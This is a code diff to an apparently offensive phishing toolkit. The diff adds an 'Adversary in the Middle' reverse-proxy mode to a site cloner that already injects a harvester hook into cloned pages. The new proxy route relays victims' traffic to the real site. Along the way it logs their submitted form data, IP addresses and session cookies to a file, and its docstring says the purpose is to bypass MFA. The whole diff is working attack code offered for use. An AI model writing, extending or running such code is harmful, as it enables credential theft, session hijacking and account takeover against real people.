@@ -6,7 +6,6 @@ import time
 import requests
 import questionary
 
-# --- START COMPATIBILITY SHIM FOR PYTHON 3.13+ ---
 try:
     import cgi
 except ImportError:
@@ -14,9 +13,8 @@ except ImportError:
     cgi = ModuleType("cgi")
     cgi.parse_header = lambda line: (line, {})
     sys.modules["cgi"] = cgi
-# --- END COMPATIBILITY SHIM ---
 
-from flask import Flask, request, send_from_directory
+from flask import Flask, request, send_from_directory, Response
 from pywebcopy import save_webpage
 from rich.console import Console
 from rich.panel import Panel
@@ -28,6 +26,9 @@ log.setLevel(logging.ERROR)
 console = Console()
 app = Flask(__name__)
 BASE_CLONE_PATH = "/opt/davoid/clones"
+
+# Reverse Proxy Configuration
+PROXY_TARGET = ""
 
 
 @app.route('/exfil', methods=['POST'])
@@ -46,12 +47,49 @@ def exfil():
     except Exception as e:
         return str(e), 500
 
+# --- NEW: Adversary in the Middle Reverse Proxy Mode ---
+
+
+@app.route('/proxy/<path:target_path>', methods=['GET', 'POST'])
+def proxy_traffic(target_path):
+    """Dynamically proxies traffic to bypass MFA and capture real-time sessions."""
+    global PROXY_TARGET
+    url = f"{PROXY_TARGET}/{target_path}"
+
+    # Extract data in real-time
+    if request.method == 'POST':
+        client_ip = request.remote_addr
+        data = request.form.to_dict() if request.form else request.get_data(as_text=True)
+        console.print(Panel(
+            f"[bold red]LIVE PROXY HARVEST[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Target:[/yellow] {url}\n[yellow]Data:[/yellow] {data}", border_style="red"))
+
+        with open("logs/harvested.txt", "a") as f:
+            f.write(
+                f"--- {time.ctime()} | {client_ip} (PROXY) ---\nURL: {url}\nDATA: {data}\nCOOKIES: {request.cookies}\n\n")
+
+    # Forward the request to the real server
+    resp = requests.request(
+        method=request.method,
+        url=url,
+        headers={key: value for (key, value)
+                 in request.headers if key != 'Host'},
+        data=request.get_data(),
+        cookies=request.cookies,
+        allow_redirects=False)
+
+    excluded_headers = ['content-encoding',
+                        'content-length', 'transfer-encoding', 'connection']
+    headers = [(name, value) for (name, value) in resp.raw.headers.items()
+               if name.lower() not in excluded_headers]
+
+    return Response(resp.content, resp.status_code, headers)
+# --------------------------------------------------------
+
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def serve_clone(path):
     directory = os.getcwd()
-    # If path is empty or a directory, try to serve index.html
     if path == "" or os.path.isdir(os.path.join(directory, path)):
         return send_from_directory(directory, 'index.html')
     return send_from_directory(directory, path)
@@ -106,12 +144,40 @@ def inject_hook(directory):
 
 
 def clone_site():
+    global PROXY_TARGET
     if os.getuid() != 0:
         return console.print("[red][!] Error: Root privileges required for Port 80.[/red]")
 
-    draw_header("Site Cloner & Harvester")
+    draw_header("Site Cloner & AitM Harvester")
+
+    mode = questionary.select(
+        "Select Operation Mode:",
+        choices=[
+            "1. Static Cloner (Download and host fake page)",
+            "2. Dynamic Reverse Proxy (AitM - MFA Bypass capable)"
+        ],
+        style=Q_STYLE
+    ).ask()
+
     target_url = questionary.text("Target URL:", style=Q_STYLE).ask()
     if not target_url:
+        return
+
+    if "Dynamic" in mode:
+        PROXY_TARGET = target_url.rstrip('/')
+        console.print(f"[*] Reverse Proxy configured for {PROXY_TARGET}")
+        if not os.path.exists("logs"):
+            os.makedirs("logs")
+
+        if questionary.confirm("Start Reverse Proxy on Port 80?", default=True, style=Q_STYLE).ask():
+            threading.Thread(target=run_server, daemon=True).start()
+            console.print(Panel(
+                f"AitM Proxy active: [bold green]http://0.0.0.0/proxy/[/bold green]\nRouting to: {PROXY_TARGET}", title="Success", border_style="green"))
+            try:
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                console.print("\n[yellow][-] Server stopped.[/yellow]")
         return
 
     project_name = questionary.text(
@@ -126,7 +192,6 @@ def clone_site():
     console.print(f"[*] Attempting to clone: {target_url}")
 
     try:
-        # Configuration to handle the browser warning and missing cgi
         save_webpage(
             url=target_url,
             project_folder=BASE_CLONE_PATH,
@@ -138,12 +203,10 @@ def clone_site():
     except Exception as e:
         console.print(f"[red][!] PyWebCopy failed: {e}[/red]")
 
-    # FALLBACK: If index.html is missing, manually pull the home page
     domain_folder = target_url.replace(
         "https://", "").replace("http://", "").split('/')[0]
     potential_index_dir = os.path.join(full_project_path, domain_folder)
 
-    # Check if the folder exists, if not, create it for manual fallback
     if not os.path.exists(potential_index_dir):
         os.makedirs(potential_index_dir)
 
@@ -161,7 +224,6 @@ def clone_site():
         except Exception as e:
             return console.print(f"[red][!] Critical failure: {e}[/red]")
 
-    # Inject into all found HTML files
     if inject_hook(full_project_path):
         console.print(
             "[green][+] Harvester hook injected successfully.[/green]")
@@ -169,7 +231,6 @@ def clone_site():
         return console.print("[red][!] Failed to inject hook into any HTML files.[/red]")
 
     if questionary.confirm("Start Harvest Server on Port 80?", default=True, style=Q_STYLE).ask():
-        # Change directory to where index.html actually is
         os.chdir(potential_index_dir)
         threading.Thread(target=run_server, daemon=True).start()
 
